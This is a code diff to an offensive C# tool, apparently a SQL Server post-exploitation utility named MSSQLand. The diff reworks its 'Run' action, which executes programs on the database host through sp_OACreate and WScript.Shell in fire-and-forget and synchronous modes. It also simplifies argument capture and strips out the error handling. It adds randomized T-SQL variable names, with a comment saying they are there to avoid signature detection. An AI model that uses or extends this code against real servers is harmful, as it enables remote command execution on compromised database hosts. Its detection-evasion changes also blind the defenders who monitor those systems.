@@ -37,7 +37,7 @@ namespace MSSQLand.Actions.Execution
         [ArgumentMetadata(ShortName = "o", LongName = "capture-output", Description = "Capture and display output (forces sync + xp_cmdshell)")]
         private bool _captureOutput = false;
 
-        [ExcludeFromArguments]
+        [ArgumentMetadata(CaptureRemaining = true, Description = "Arguments to pass to the executable")]
         private string _arguments = "";
 
         /// <summary>
@@ -46,10 +46,11 @@ namespace MSSQLand.Actions.Execution
         /// <param name="args">File path and optional flags/arguments.</param>
         public override void ValidateArguments(string[] args)
         {
-            // Get positional args before BindArguments consumes them
-            var (_, positionalArgs) = ParseActionArguments(args);
+            if (args == null || args.Length == 0)
+            {
+                throw new ArgumentException("Run action requires a file path as an argument.");
+            }
 
-            // Bind known arguments
             BindArguments(args);
 
             if (string.IsNullOrWhiteSpace(_filePath))
@@ -59,12 +60,6 @@ namespace MSSQLand.Actions.Execution
 
             // Normalize path
             _filePath = _filePath.Replace("/", "\\");
-
-            // Extract additional arguments (remaining positional args after file path)
-            if (positionalArgs.Count > 1)
-            {
-                _arguments = string.Join(" ", positionalArgs.Skip(1));
-            }
 
             // Log mode
             if (_captureOutput)
@@ -136,97 +131,50 @@ namespace MSSQLand.Actions.Execution
                 string escapedArgs = _arguments.Replace("'", "''");
 
                 // Build the command string
-                string command = string.IsNullOrWhiteSpace(_arguments) 
-                    ? escapedPath 
-                    : $"{escapedPath} {escapedArgs}";
+                string command = string.IsNullOrWhiteSpace(_arguments) ? escapedPath : $"{escapedPath} {escapedArgs}";
+
+                // Randomized variable names to avoid signature detection
+                string objVar = Misc.GetRandomIdentifier(6);
+                string retVar = Misc.GetRandomIdentifier(6);
 
                 // waitOnReturn: 0 = async (don't wait), 1 = sync (wait for completion)
                 string waitParam = asyncMode ? "0" : "1";
 
                 if (asyncMode)
                 {
-                    // Async mode - no exit code returned
-                    // Creates WScript.Shell object and calls Run method with waitOnReturn=0 (don't wait)
+                    // Fire and forget
                     string query = $@"
-DECLARE @ObjectToken INT;
-DECLARE @Result INT;
-DECLARE @ErrorSource NVARCHAR(255);
-DECLARE @ErrorDesc NVARCHAR(255);
-
-EXEC @Result = sp_OACreate 'WScript.Shell', @ObjectToken OUTPUT;
-IF @Result <> 0
-BEGIN
-    EXEC sp_OAGetErrorInfo @ObjectToken, @ErrorSource OUT, @ErrorDesc OUT;
-    RAISERROR('Failed to create WScript.Shell: %s', 16, 1, @ErrorDesc);
-    RETURN;
-END
-
-EXEC @Result = sp_OAMethod @ObjectToken, 'Run', NULL, '{command}', 0, {waitParam};
-IF @Result <> 0
-BEGIN
-    EXEC sp_OAGetErrorInfo @ObjectToken, @ErrorSource OUT, @ErrorDesc OUT;
-    EXEC sp_OADestroy @ObjectToken;
-    RAISERROR('Failed to execute file: %s', 16, 1, @ErrorDesc);
-    RETURN;
-END
-
-EXEC sp_OADestroy @ObjectToken;
-";
+DECLARE @{objVar} INT;
+EXEC sp_oacreate 'wscript.shell', @{objVar} out;
+EXEC sp_oamethod @{objVar}, 'Run', NULL, '{command}', 0, {waitParam};
+EXEC sp_oadestroy @{objVar};";
 
                     databaseContext.QueryService.ExecuteNonProcessing(query);
                     Logger.Success("File launched successfully via OLE (running in background)");
                     return "Process launched in background";
                 }
-                else
+
+                // Sync mode - wait and return exit code
+                string exitVar = Misc.GetRandomIdentifier(6);
+                string syncQuery = $@"
+DECLARE @{objVar} INT;
+DECLARE @{exitVar} INT;
+EXEC sp_oacreate 'wscript.shell', @{objVar} out;
+EXEC sp_oamethod @{objVar}, 'Run', @{exitVar} out, '{command}', 0, {waitParam};
+EXEC sp_oadestroy @{objVar};
+SELECT @{exitVar} AS ExitCode;";
+
+                DataTable result = databaseContext.QueryService.ExecuteTable(syncQuery);
+
+                if (result == null || result.Rows.Count == 0)
                 {
-                    // Sync mode - wait and return exit code
-                    // Creates WScript.Shell object and calls Run method with waitOnReturn=1 (wait for completion)
-                    // Returns the exit code from the executed process
-                    string query = $@"
-DECLARE @ObjectToken INT;
-DECLARE @Result INT;
-DECLARE @ErrorSource NVARCHAR(255);
-DECLARE @ErrorDesc NVARCHAR(255);
-DECLARE @ExitCode INT;
-
-EXEC @Result = sp_OACreate 'WScript.Shell', @ObjectToken OUTPUT;
-IF @Result <> 0
-BEGIN
-    EXEC sp_OAGetErrorInfo @ObjectToken, @ErrorSource OUT, @ErrorDesc OUT;
-    RAISERROR('Failed to create WScript.Shell: %s', 16, 1, @ErrorDesc);
-    RETURN;
-END
-
-EXEC @Result = sp_OAMethod @ObjectToken, 'Run', @ExitCode OUTPUT, '{command}', 0, {waitParam};
-IF @Result <> 0
-BEGIN
-    EXEC sp_OAGetErrorInfo @ObjectToken, @ErrorSource OUT, @ErrorDesc OUT;
-    EXEC sp_OADestroy @ObjectToken;
-    RAISERROR('Failed to execute file: %s', 16, 1, @ErrorDesc);
-    RETURN;
-END
-
-EXEC sp_OADestroy @ObjectToken;
-
-SELECT @ExitCode AS ExitCode;
-";
-
-                    DataTable result = databaseContext.QueryService.ExecuteTable(query);
-
-                    if (result != null && result.Rows.Count > 0)
-                    {
-                        int exitCode = result.Rows[0]["ExitCode"] != DBNull.Value 
-                            ? Convert.ToInt32(result.Rows[0]["ExitCode"]) 
-                            : -1;
-                        Logger.Success($"File executed successfully via OLE (Exit Code: {exitCode})");
-                        return $"Exit code: {exitCode}";
-                    }
-                    else
-                    {
-                        Logger.Error("OLE execution failed");
-                        return null;
-                    }
+                    Logger.Error("OLE execution failed");
+                    return null;
                 }
+
+                int exitCode = result.Rows[0]["ExitCode"] != DBNull.Value ? Convert.ToInt32(result.Rows[0]["ExitCode"]) : -1;
+                Logger.Success($"File executed successfully via OLE (Exit Code: {exitCode})");
+                return $"Exit code: {exitCode}";
             }
             catch (Exception ex)
             {
